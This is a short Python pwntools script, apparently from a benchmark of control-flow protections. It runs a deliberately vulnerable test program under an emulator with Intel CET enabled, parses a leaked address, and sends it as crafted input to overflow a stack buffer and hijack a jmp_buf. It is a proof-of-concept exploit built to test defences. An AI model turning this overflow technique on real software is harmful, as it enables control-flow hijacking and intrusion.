from pwn import process, p64
import os 
import time
import binascii

p = '~/CET/sde/sde64 -cet -- '
# p = ''
p += '/afs/inf.ed.ac.uk/user/s21/s2150204/CET/recipe-benchmark/Testcases/stack_NBoundOFlow_jmpbuf_homebrew/main'

# os.environ['GLIBC_TUNABLES'] = 'glibc.cpu.hwcaps=SHSTK,IBT'
print(p)

p = process(p, shell=True)
badaddr = str(p.recvline())
inp = badaddr.strip().split(':')[1]
inp = inp[2:-3]
_inp = ''.join([_ for _ in reversed([inp[2*i:2*i+2] for i in range(0, 3)])])
inp = binascii.unhexlify(_inp)
inp += b'\x00'*5
print(inp)
p.sendline(inp)
time.sleep(1)
p.kill()
